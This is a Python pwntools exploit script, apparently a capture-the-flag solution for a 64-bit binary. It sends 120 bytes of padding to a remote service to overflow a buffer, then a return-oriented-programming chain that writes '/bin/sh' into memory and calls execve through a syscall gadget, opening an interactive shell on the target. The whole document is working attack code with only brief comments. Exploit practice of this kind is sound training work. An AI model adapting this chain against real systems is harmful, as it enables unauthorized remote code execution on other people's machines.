from pwn import *

p = remote("IP", PORT)

# ROP prep
pop_rax = 0x4005af # pop rax ; ret
pop_rdi = 0x4006a6 # pop rdi ; ret
pop_rsi = 0x410003 # pop rsi ; ret
pop_rdx = 0x44b446 # pop rdx ; ret
syscall = 0x40127c # syscall


# shell prep
shloc = 0x6b6000 # found from vmmap
movptr = 0x47f3c1 # mov qword ptr [rsi], rax ; ret

payload = b'A' * 120

# shell
payload += p64(pop_rax) +  b'/bin/sh\x00'
payload += p64(pop_rsi) + p64(shloc)
payload += p64(movptr)


# ROP (execve syscall)
# rax : 59 (0x3b)
# rdi : ptr to /bin/sh
# rdx : 0 
# rsi : 0

payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(shloc)
payload += p64(pop_rdx) + p64(0) 
payload += p64(pop_rsi) + p64(0)

# syscall
payload += p64(syscall)

p.sendline(payload)
p.interactive()